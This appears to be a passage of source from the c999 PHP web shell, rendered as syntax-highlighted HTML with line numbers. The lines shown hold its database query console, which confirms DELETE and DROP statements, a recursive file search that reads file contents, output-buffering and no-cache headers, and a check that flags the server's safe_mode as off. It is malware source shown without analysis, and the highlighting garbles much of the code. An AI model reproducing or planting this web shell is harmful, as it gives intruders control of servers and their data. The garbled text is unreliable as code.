<span class="lineno"> 672</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
<span class="lineno"> 673</span>  <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span>
<span class="lineno"> 674</span>  <span class="p">{</span>
<span class="lineno"> 675</span>   <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno"> 676</span> <span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$tbl_struct</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno"> 677</span> <span class="s2">&lt;table border=&quot;</span><span class="mi">0</span><span class="s2">&quot;&gt;</span>
<span class="lineno"> 678</span> <span class="s2">&lt;tbody&gt;</span>
<span class="lineno"> 679</span> <span class="s2">&lt;tr&gt;</span>
<span class="lineno"> 680</span> <span class="s2">&lt;td&gt;&lt;form method=&quot;</span><span class="nx">POST</span><span class="s2">&quot; name=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">c999sh_sqlquery\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;&lt;b&gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;:&lt;/b&gt;</span>
<span class="lineno"> 681</span> 
<span class="lineno"> 682</span> <span class="s2">&lt;textarea cols=&quot;</span><span class="mi">100</span><span class="s2">&quot; name=&quot;</span><span class="nx">sql_query</span><span class="s2">&quot; rows=&quot;</span><span class="mi">10</span><span class="s2">&quot;&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;</span>
<span class="lineno"> 683</span> 
<span class="lineno"> 684</span> <span class="s2">&lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">act</span><span class="s2">&quot; value=&quot;</span><span class="nx">sql</span><span class="s2">&quot; /&gt;&lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">sql_act</span><span class="s2">&quot; value=&quot;</span><span class="nx">query</span><span class="s2">&quot; /&gt;&lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">sql_tbl</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">submit</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">1</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">sql_goto\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&lt;input type=&quot;</span><span class="nx">submit</span><span class="s2">&quot; name=&quot;</span><span class="nx">sql_confirm</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Yes\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&lt;input type=&quot;</span><span class="nx">submit</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">No\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&gt;&lt;/form&gt;&lt;/td&gt;</span>
<span class="lineno"> 685</span> <span class="s2">&lt;td valign=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">top\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;&lt;b&gt;Fields:&lt;/b&gt;</span>
<span class="lineno"> 686</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 687</span>  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span> <span class="k">echo</span> <span class="s2">&quot; &lt;a onclick=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">document</span><span class="o">.</span><span class="nx">c999sh_sqlquery</span><span class="o">.</span><span class="nx">sql_query</span><span class="o">.</span><span class="nx">value</span><span class="o">+=</span><span class="s1">&#39;`&amp;quot;.$name.&amp;quot;`&#39;</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="c1">#\&amp;quot;&quot;&gt;&lt;b&gt;&quot;.$name.&quot;&lt;/b&gt;&lt;/a&gt;</span>
<span class="lineno"> 688</span> <span class="s2">&quot;;}</span>
<span class="lineno"> 689</span> <span class="s2"> echo &quot;</span><span class="o">&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno"> 690</span> <span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span>
<span class="lineno"> 691</span> <span class="o">&lt;/</span><span class="nx">tbody</span><span class="o">&gt;</span>
<span class="lineno"> 692</span> <span class="o">&lt;/</span><span class="nx">table</span><span class="o">&gt;</span>
<span class="lineno"> 693</span> <span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span>
<span class="lineno"> 694</span> <span class="s2">&quot;;</span>
<span class="lineno"> 695</span> <span class="s2"> }</span>
<span class="lineno"> 696</span> <span class="s2"> }</span>
<span class="lineno"> 697</span> <span class="s2"> if (</span><span class="si">$sql_query_result</span><span class="s2"> or (!</span><span class="si">$sql_confirm</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="nv">$sql_last_query</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 698</span> <span class="s2">}</span>
<span class="lineno"> 699</span> <span class="s2">}</span>
<span class="lineno"> 700</span> <span class="s2">if (!function_exists(&quot;</span><span class="nb">mysql_create_db</span><span class="s2">&quot;))</span>
<span class="lineno"> 701</span> <span class="s2">{</span>
<span class="lineno"> 702</span> <span class="s2">function mysql_create_db(</span><span class="si">$db</span><span class="s2">,</span><span class="si">$sock</span><span class="s2">=&quot;&quot;)</span>
<span class="lineno"> 703</span> <span class="s2">{</span>
<span class="lineno"> 704</span> <span class="s2"> </span><span class="si">$sql</span><span class="s2"> = &quot;</span><span class="nx">CREATE</span> <span class="nx">DATABASE</span> <span class="sb">`&quot;.addslashes($db).&quot;`</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="lineno"> 705</span> <span class="s2"> if (</span><span class="si">$sock</span><span class="s2">) {return mysql_query(</span><span class="si">$sql</span><span class="s2">,</span><span class="si">$sock</span><span class="s2">);}</span>
<span class="lineno"> 706</span> <span class="s2"> else {return mysql_query(</span><span class="si">$sql</span><span class="s2">);}</span>
<span class="lineno"> 707</span> <span class="s2">}</span>
<span class="lineno"> 708</span> <span class="s2">}</span>
<span class="lineno"> 709</span> <span class="s2">if (!function_exists(&quot;</span><span class="nx">mysql_query_parse</span><span class="s2">&quot;))</span>
<span class="lineno"> 710</span> <span class="s2">{</span>
<span class="lineno"> 711</span> <span class="s2">function mysql_query_parse(</span><span class="si">$query</span><span class="s2">)</span>
<span class="lineno"> 712</span> <span class="s2">{</span>
<span class="lineno"> 713</span> <span class="s2"> </span><span class="si">$query</span><span class="s2"> = trim(</span><span class="si">$query</span><span class="s2">);</span>
<span class="lineno"> 714</span> <span class="s2"> </span><span class="si">$arr</span><span class="s2"> = explode (&quot;</span> <span class="s2">&quot;,</span><span class="si">$query</span><span class="s2">);</span>
<span class="lineno"> 715</span> <span class="s2"> /*array array()</span>
<span class="lineno"> 716</span> <span class="s2"> {</span>
<span class="lineno"> 717</span> <span class="s2"> &quot;</span><span class="nx">METHOD</span><span class="s2">&quot;=&gt;array(output_type),</span>
<span class="lineno"> 718</span> <span class="s2"> &quot;</span><span class="nx">METHOD1</span><span class="s2">&quot;...</span>
<span class="lineno"> 719</span> <span class="s2"> ...</span>
<span class="lineno"> 720</span> <span class="s2"> }</span>
<span class="lineno"> 721</span> <span class="s2"> if output_type == 0, no output,</span>
<span class="lineno"> 722</span> <span class="s2"> if output_type == 1, no output if no error</span>
<span class="lineno"> 723</span> <span class="s2"> if output_type == 2, output without control-buttons</span>
<span class="lineno"> 724</span> <span class="s2"> if output_type == 3, output with control-buttons</span>
<span class="lineno"> 725</span> <span class="s2"> */</span>
<span class="lineno"> 726</span> <span class="s2"> </span><span class="si">$types</span><span class="s2"> = array(</span>
<span class="lineno"> 727</span> <span class="s2"> &quot;</span><span class="nx">SELECT</span><span class="s2">&quot;=&gt;array(3,1),</span>
<span class="lineno"> 728</span> <span class="s2"> &quot;</span><span class="nx">SHOW</span><span class="s2">&quot;=&gt;array(2,1),</span>
<span class="lineno"> 729</span> <span class="s2"> &quot;</span><span class="nx">DELETE</span><span class="s2">&quot;=&gt;array(1),</span>
<span class="lineno"> 730</span> <span class="s2"> &quot;</span><span class="nx">DROP</span><span class="s2">&quot;=&gt;array(1)</span>
<span class="lineno"> 731</span> <span class="s2"> );</span>
<span class="lineno"> 732</span> <span class="s2"> </span><span class="si">$result</span><span class="s2"> = array();</span>
<span class="lineno"> 733</span> <span class="s2"> </span><span class="si">$op</span><span class="s2"> = strtoupper(</span><span class="si">$arr[0]</span><span class="s2">);</span>
<span class="lineno"> 734</span> <span class="s2"> if (is_array(</span><span class="si">$types[$op]</span><span class="s2">))</span>
<span class="lineno"> 735</span> <span class="s2"> {</span>
<span class="lineno"> 736</span> <span class="s2"> </span><span class="si">$result[&quot;propertions&quot;]</span><span class="s2"> = </span><span class="si">$types[$op]</span><span class="s2">;</span>
<span class="lineno"> 737</span> <span class="s2"> </span><span class="si">$result[&quot;query&quot;]</span><span class="s2"> = </span><span class="si">$query</span><span class="s2">;</span>
<span class="lineno"> 738</span> <span class="s2"> if (</span><span class="si">$types[$op]</span><span class="s2"> == 2)</span>
<span class="lineno"> 739</span> <span class="s2"> {</span>
<span class="lineno"> 740</span> <span class="s2"> foreach(</span><span class="si">$arr</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&gt;</span><span class="si">$v</span><span class="s2">)</span>
<span class="lineno"> 741</span> <span class="s2"> {</span>
<span class="lineno"> 742</span> <span class="s2"> if (strtoupper(</span><span class="si">$v</span><span class="s2">) == &quot;</span><span class="nx">LIMIT</span><span class="s2">&quot;)</span>
<span class="lineno"> 743</span> <span class="s2"> {</span>
<span class="lineno"> 744</span> <span class="s2"> </span><span class="si">$result[&quot;limit&quot;]</span><span class="s2"> = </span><span class="si">$arr[$k+1]</span><span class="s2">;</span>
<span class="lineno"> 745</span> <span class="s2"> </span><span class="si">$result[&quot;limit&quot;]</span><span class="s2"> = explode(&quot;</span><span class="p">,</span><span class="s2">&quot;,</span><span class="si">$result[&quot;limit&quot;]</span><span class="s2">);</span>
<span class="lineno"> 746</span> <span class="s2"> if (count(</span><span class="si">$result[&quot;limit&quot;]</span><span class="s2">) == 1) </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 747</span> <span class="s2"> unset(</span><span class="si">$arr[$k]</span><span class="s2">,</span><span class="si">$arr[$k+1]</span><span class="s2">);</span>
<span class="lineno"> 748</span> <span class="s2"> }</span>
<span class="lineno"> 749</span> <span class="s2"> }</span>
<span class="lineno"> 750</span> <span class="s2"> }</span>
<span class="lineno"> 751</span> <span class="s2"> }</span>
<span class="lineno"> 752</span> <span class="s2"> else {return FALSE;}</span>
<span class="lineno"> 753</span> <span class="s2">}</span>
<span class="lineno"> 754</span> <span class="s2">}</span>
<span class="lineno"> 755</span> <span class="s2">if (!function_exists(&quot;</span><span class="nx">c999fsearch</span><span class="s2">&quot;))</span>
<span class="lineno"> 756</span> <span class="s2">{</span>
<span class="lineno"> 757</span> <span class="s2">function c999fsearch(</span><span class="si">$d</span><span class="s2">)</span>
<span class="lineno"> 758</span> <span class="s2">{</span>
<span class="lineno"> 759</span> <span class="s2"> global </span><span class="si">$found</span><span class="s2">;</span>
<span class="lineno"> 760</span> <span class="s2"> global </span><span class="si">$found_d</span><span class="s2">;</span>
<span class="lineno"> 761</span> <span class="s2"> global </span><span class="si">$found_f</span><span class="s2">;</span>
<span class="lineno"> 762</span> <span class="s2"> global </span><span class="si">$search_i_f</span><span class="s2">;</span>
<span class="lineno"> 763</span> <span class="s2"> global </span><span class="si">$search_i_d</span><span class="s2">;</span>
<span class="lineno"> 764</span> <span class="s2"> global </span><span class="si">$a</span><span class="s2">;</span>
<span class="lineno"> 765</span> <span class="s2"> if (substr(</span><span class="si">$d</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 766</span> <span class="s2"> </span><span class="si">$h</span><span class="s2"> = opendir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="lineno"> 767</span> <span class="s2"> while ((</span><span class="si">$f</span><span class="s2"> = readdir(</span><span class="si">$h</span><span class="s2">)) !== FALSE)</span>
<span class="lineno"> 768</span> <span class="s2"> {</span>
<span class="lineno"> 769</span> <span class="s2"> if(</span><span class="si">$f</span><span class="s2"> != &quot;</span><span class="o">.</span><span class="s2">&quot; &amp;&amp; </span><span class="si">$f</span><span class="s2"> != &quot;</span><span class="o">..</span><span class="s2">&quot;)</span>
<span class="lineno"> 770</span> <span class="s2"> {</span>
<span class="lineno"> 771</span> <span class="s2"> </span><span class="si">$bool</span><span class="s2"> = (empty(</span><span class="si">$a[&quot;name_regexp&quot;]</span><span class="s2">) and strpos(</span><span class="si">$f</span><span class="s2">,</span><span class="si">$a[&quot;name&quot;]</span><span class="s2">) !== FALSE) || (</span><span class="si">$a[&quot;name_regexp&quot;]</span><span class="s2"> and ereg(</span><span class="si">$a[&quot;name&quot;]</span><span class="s2">,</span><span class="si">$f</span><span class="s2">));</span>
<span class="lineno"> 772</span> <span class="s2"> if (is_dir(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">))</span>
<span class="lineno"> 773</span> <span class="s2"> {</span>
<span class="lineno"> 774</span> <span class="s2"> </span><span class="si">$search_i_d</span><span class="s2">++;</span>
<span class="lineno"> 775</span> <span class="s2"> if (empty(</span><span class="si">$a[&quot;text&quot;]</span><span class="s2">) and </span><span class="si">$bool</span><span class="s2">) </span><span class="si">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_d</span><span class="o">++</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 776</span> <span class="s2"> if (!is_link(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">)) {c999fsearch(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">);}</span>
<span class="lineno"> 777</span> <span class="s2"> }</span>
<span class="lineno"> 778</span> <span class="s2"> else</span>
<span class="lineno"> 779</span> <span class="s2"> {</span>
<span class="lineno"> 780</span> <span class="s2"> </span><span class="si">$search_i_f</span><span class="s2">++;</span>
<span class="lineno"> 781</span> <span class="s2"> if (</span><span class="si">$bool</span><span class="s2">)</span>
<span class="lineno"> 782</span> <span class="s2"> {</span>
<span class="lineno"> 783</span> <span class="s2"> if (!empty(</span><span class="si">$a[&quot;text&quot;]</span><span class="s2">))</span>
<span class="lineno"> 784</span> <span class="s2"> {</span>
<span class="lineno"> 785</span> <span class="s2"> </span><span class="si">$r</span><span class="s2"> = @file_get_contents(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">);</span>
<span class="lineno"> 786</span> <span class="s2"> if (</span><span class="si">$a[&quot;text_wwo&quot;]</span><span class="s2">) </span><span class="si">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 787</span> <span class="s2"> if (!</span><span class="si">$a[&quot;text_cs&quot;]</span><span class="s2">) </span><span class="si">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]);</span> <span class="nv">$r</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 788</span> <span class="s2"> if (</span><span class="si">$a[&quot;text_regexp&quot;]</span><span class="s2">) </span><span class="si">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="nv">$r</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 789</span> <span class="s2"> else </span><span class="si">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$r</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="mi">1</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 790</span> <span class="s2"> if (</span><span class="si">$a[&quot;text_not&quot;]</span><span class="s2">) </span><span class="si">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="o">!</span><span class="nv">$bool</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 791</span> <span class="s2"> if (</span><span class="si">$bool</span><span class="s2">) </span><span class="si">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 792</span> <span class="s2"> }</span>
<span class="lineno"> 793</span> <span class="s2"> else </span><span class="si">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 794</span> <span class="s2"> }</span>
<span class="lineno"> 795</span> <span class="s2"> }</span>
<span class="lineno"> 796</span> <span class="s2"> }</span>
<span class="lineno"> 797</span> <span class="s2"> }</span>
<span class="lineno"> 798</span> <span class="s2"> closedir(</span><span class="si">$h</span><span class="s2">);</span>
<span class="lineno"> 799</span> <span class="s2">}</span>
<span class="lineno"> 800</span> <span class="s2">}</span>
<span class="lineno"> 801</span> <span class="s2">if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">gofile</span><span class="s2">&quot;) {if (is_dir(</span><span class="si">$f</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span><span class="si">}</span><span class="s2"> else </span><span class="si">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span><span class="si">}</span><span class="s2">}</span>
<span class="lineno"> 802</span> <span class="s2">//Sending headers</span>
<span class="lineno"> 803</span> <span class="s2">@ob_start();</span>
<span class="lineno"> 804</span> <span class="s2">@ob_implicit_flush(0);</span>
<span class="lineno"> 805</span> <span class="s2">function onphpshutdown()</span>
<span class="lineno"> 806</span> <span class="s2">{</span>
<span class="lineno"> 807</span> <span class="s2"> global </span><span class="si">$gzipencode</span><span class="s2">,</span><span class="si">$ft</span><span class="s2">;</span>
<span class="lineno"> 808</span> <span class="s2"> if (!headers_sent() and </span><span class="si">$gzipencode</span><span class="s2"> and !in_array(</span><span class="si">$ft</span><span class="s2">,array(&quot;</span><span class="nx">img</span><span class="s2">&quot;,&quot;</span><span class="nx">download</span><span class="s2">&quot;,&quot;</span><span class="nx">notepad</span><span class="s2">&quot;)))</span>
<span class="lineno"> 809</span> <span class="s2"> {</span>
<span class="lineno"> 810</span> <span class="s2"> </span><span class="si">$v</span><span class="s2"> = @ob_get_contents();</span>
<span class="lineno"> 811</span> <span class="s2"> @ob_end_clean();</span>
<span class="lineno"> 812</span> <span class="s2"> @ob_start(&quot;</span><span class="nx">ob_gzHandler</span><span class="s2">&quot;);</span>
<span class="lineno"> 813</span> <span class="s2"> echo </span><span class="si">$v</span><span class="s2">;</span>
<span class="lineno"> 814</span> <span class="s2"> @ob_end_flush();</span>
<span class="lineno"> 815</span> <span class="s2"> }</span>
<span class="lineno"> 816</span> <span class="s2">}</span>
<span class="lineno"> 817</span> <span class="s2">function c999shexit()</span>
<span class="lineno"> 818</span> <span class="s2">{</span>
<span class="lineno"> 819</span> <span class="s2"> onphpshutdown();</span>
<span class="lineno"> 820</span> <span class="s2"> exit;</span>
<span class="lineno"> 821</span> <span class="s2">}</span>
<span class="lineno"> 822</span> <span class="s2">header(&quot;</span><span class="nx">Expires</span><span class="o">:</span> <span class="nx">Mon</span><span class="p">,</span> <span class="mi">26</span> <span class="nx">Jul</span> <span class="mi">1997</span> <span class="mo">05</span><span class="o">:</span><span class="mo">00</span><span class="o">:</span><span class="mo">00</span> <span class="nx">GMT</span><span class="s2">&quot;);</span>
<span class="lineno"> 823</span> <span class="s2">header(&quot;</span><span class="nx">Last</span><span class="o">-</span><span class="nx">Modified</span><span class="o">:</span> <span class="s2">&quot;.gmdate(&quot;</span><span class="nx">D</span><span class="p">,</span> <span class="nx">d</span> <span class="nx">M</span> <span class="nx">Y</span> <span class="nx">H</span><span class="o">:</span><span class="nx">i</span><span class="o">:</span><span class="nx">s</span><span class="s2">&quot;).&quot;</span> <span class="nx">GMT</span><span class="s2">&quot;);</span>
<span class="lineno"> 824</span> <span class="s2">header(&quot;</span><span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">store</span><span class="p">,</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span><span class="p">,</span> <span class="nx">must</span><span class="o">-</span><span class="nx">revalidate</span><span class="s2">&quot;);</span>
<span class="lineno"> 825</span> <span class="s2">header(&quot;</span><span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">post</span><span class="o">-</span><span class="nx">check</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="nx">pre</span><span class="o">-</span><span class="nx">check</span><span class="o">=</span><span class="mi">0</span><span class="s2">&quot;, FALSE);</span>
<span class="lineno"> 826</span> <span class="s2">header(&quot;</span><span class="nx">Pragma</span><span class="o">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span><span class="s2">&quot;);</span>
<span class="lineno"> 827</span> <span class="s2">if (empty(</span><span class="si">$tmpdir</span><span class="s2">))</span>
<span class="lineno"> 828</span> <span class="s2">{</span>
<span class="lineno"> 829</span> <span class="s2"> </span><span class="si">$tmpdir</span><span class="s2"> = ini_get(&quot;</span><span class="nx">upload_tmp_dir</span><span class="s2">&quot;);</span>
<span class="lineno"> 830</span> <span class="s2"> if (is_dir(</span><span class="si">$tmpdir</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$tmpdir</span> <span class="o">=</span> <span class="s2">&quot;/tmp/&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 831</span> <span class="s2">}</span>
<span class="lineno"> 832</span> <span class="si">$tmpdir</span><span class="s2"> = realpath(</span><span class="si">$tmpdir</span><span class="s2">);</span>
<span class="lineno"> 833</span> <span class="si">$tmpdir</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$tmpdir</span><span class="s2">);</span>
<span class="lineno"> 834</span> <span class="s2">if (substr(</span><span class="si">$tmpdir</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$tmpdir</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 835</span> <span class="s2">if (empty(</span><span class="si">$tmpdir_logs</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 836</span> <span class="s2">else </span><span class="si">{</span><span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$tmpdir_logs</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 837</span> <span class="s2">if (@ini_get(&quot;</span><span class="nx">safe_mode</span><span class="s2">&quot;) or strtolower(@ini_get(&quot;</span><span class="nx">safe_mode</span><span class="s2">&quot;)) == &quot;</span><span class="nx">on</span><span class="s2">&quot;)</span>
<span class="lineno"> 838</span> <span class="s2">{</span>
<span class="lineno"> 839</span> <span class="s2"> </span><span class="si">$safemode</span><span class="s2"> = TRUE;</span>
<span class="lineno"> 840</span> <span class="s2"> </span><span class="si">$hsafemode</span><span class="s2"> = &quot;</span><span class="o">&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
<span class="lineno"> 841</span> <span class="o">&lt;</span><span class="nx">span</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;color: red;&quot;</span><span class="o">&gt;</span><span class="nx">ON</span> <span class="p">(</span><span class="nx">secure</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">span</span><span class="o">&gt;</span>
<span class="lineno"> 842</span> <span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 843</span> <span class="s2">}</span>
<span class="lineno"> 844</span> <span class="s2">else </span><span class="si">{</span><span class="nv">$safemode</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$hsafemode</span> <span class="o">=</span> <span class="s2">&quot;&lt;/pre&gt;</span>
<span class="lineno"> 845</span> <span class="s2">&lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">green</span><span class="p">;</span><span class="s2">&quot;&gt;OFF (not secure)&lt;/span&gt;</span>
<span class="lineno"> 846</span> <span class="s2">&lt;pre&gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
